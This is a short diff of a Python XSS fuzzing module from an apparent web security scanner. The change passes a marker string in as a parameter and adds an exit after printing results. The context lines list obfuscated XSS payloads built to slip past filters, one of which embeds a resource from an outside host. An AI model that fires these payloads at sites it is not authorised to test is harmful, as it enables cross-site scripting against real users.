@@ -13,8 +13,6 @@ info = '\033[93m[!]\033[0m'
 bad = '\033[91m[-]\033[0m'
 run = '\033[97m[~]\033[0m'
 
-xsschecker = 'v3dm0s'
-
 # "Not so malicious" payloads for fuzzing
 fuzzes = ['<z oNxXx=yyy>', '<z xXx=yyy>', '<z o%00nload=yyy>', '<z oNStart=confirm()>', '<z oNMousEDown=(((confirm)))()>', '<z oNMousEDown=(prompt)``>', '<EmBed sRc=//14.rs>',
 '<EmBed sRc=\/\\14.rs>', '<z oNMoUseOver=yyy>', '<z oNMoUsedoWn=yyy>', '<z oNfoCus=yyy>', '<z oNsUbmit=yyy>', '<z oNToggLe=yyy>', '<z oNoRieNtATionChaNge=yyy>', '<z OnReaDyStateChange=yyy>',
@@ -23,7 +21,7 @@ fuzzes = ['<z oNxXx=yyy>', '<z xXx=yyy>', '<z o%00nload=yyy>', '<z oNStart=confi
 '">payload<br attr="', '&#x3C;script&#x3E;', '<r sRc=x oNError=r>', '<x OnCliCk=(prompt)()>click',
 '<bGsOund sRc=x>']
 
-def fuzzer(url, param_data, method, delay):
+def fuzzer(url, param_data, method, delay, xsschecker):
     result = [] # Result of fuzzing
     progress = 0 # Variable for recording the progress of fuzzing
     for i in fuzzes:
@@ -74,3 +72,4 @@ def fuzzer(url, param_data, method, delay):
     for value in result:
         table.add_row([value['fuzz'], value['result']]) # Adds the value of fuzz and result to the columns
     print('\n', table)
+    quit()
